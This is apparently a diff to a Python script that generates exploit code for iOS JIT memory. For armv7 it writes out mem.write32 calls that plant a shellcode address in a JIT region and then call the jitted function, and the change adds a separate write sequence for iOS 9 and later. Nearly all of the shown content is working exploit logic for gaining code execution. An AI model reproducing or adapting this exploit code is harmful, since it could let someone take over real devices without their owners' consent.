@@ -33,11 +33,18 @@ def main():
         if arch == "arm64":
             target.write("jitted_func();\n")
         elif arch == "armv7":
-            target.write("mem.write32(jit_addr2, jit_addr2+0x4);\n")
-            target.write("mem.write32(jit_addr2+0x4, jit_addr2+0x4);\n")
-            target.write("mem.write32(jit_addr2+0x08, shellcode);\n")
-            target.write("mem.write32(jit_addr2+0x30, jit_addr2+0x1C);\n")
-            target.write("mem.write32(jit_addr2+0x34, jit_addr2-0x14);\n")
+            target.write("\nif (ios_version >= 9) {\n")
+            target.write("\tmem.write32(jit_addr2, jit_addr2+0x4);\n")
+            target.write("\tmem.write32(jit_addr2+0x4, jit_addr2+0x4);\n")
+            target.write("\tmem.write32(jit_addr2+0x30, jit_addr2+0x1C);\n")
+            target.write("\tmem.write32(jit_addr2+0x34, shellcode);\n")
+            target.write("} else {\n")
+            target.write("\tmem.write32(jit_addr2, jit_addr2+0x4);\n")
+            target.write("\tmem.write32(jit_addr2+0x4, jit_addr2+0x4);\n")
+            target.write("\tmem.write32(jit_addr2+0x08, shellcode);\n")
+            target.write("\tmem.write32(jit_addr2+0x30, jit_addr2+0x1C);\n")
+            target.write("\tmem.write32(jit_addr2+0x34, jit_addr2-0x14);\n")
+            target.write("}\n\n")
             target.write("jit_func2();\n")
 
 if __name__ == "__main__":
